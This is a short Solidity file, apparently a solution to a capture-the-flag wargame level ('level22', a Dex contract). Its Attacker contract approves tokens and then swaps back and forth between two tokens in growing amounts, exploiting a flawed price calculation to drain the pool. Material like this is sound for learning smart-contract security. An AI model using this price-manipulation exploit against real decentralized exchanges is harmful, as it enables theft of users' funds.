// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/level22.sol";
import "hardhat/console.sol";

contract Attacker
{
    Dex level22;
    constructor(address _level22)
    {
        level22 = Dex(_level22);
    }

    function exploit() external 
    {
        level22.approve(address(level22), 500);

        address token1 = level22.token1();
        address token2 = level22.token2();

        level22.swap(token1, token2, 10);
        level22.swap(token2, token1, 20);
        level22.swap(token1, token2, 24);
        level22.swap(token2, token1, 30);
        level22.swap(token1, token2, 41);
        level22.swap(token2, token1, 45);
    }
}